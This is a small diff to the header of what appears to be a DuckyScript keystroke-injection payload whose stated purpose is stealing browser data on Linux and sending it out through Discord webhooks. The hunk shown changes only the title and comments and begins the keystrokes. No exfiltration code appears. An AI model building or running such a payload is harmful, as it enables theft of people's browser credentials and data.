@@ -1,10 +1,12 @@
-REM     Title: Browser Data
+REM     Title: BrowserDataLinuxGeneral
 
 REM     Author: MagikarpLv13
 
 REM     Description: This payload is meant to steal Browser Data and send it using discord webhooks
 
 REM     Target: Maximum Linux distributions
+
+REM     Most of Linux distributions have multiple terminal cmd available. In almost all cases, the second one is not one with root permissions
 
 ALT F1
 DELAY 500
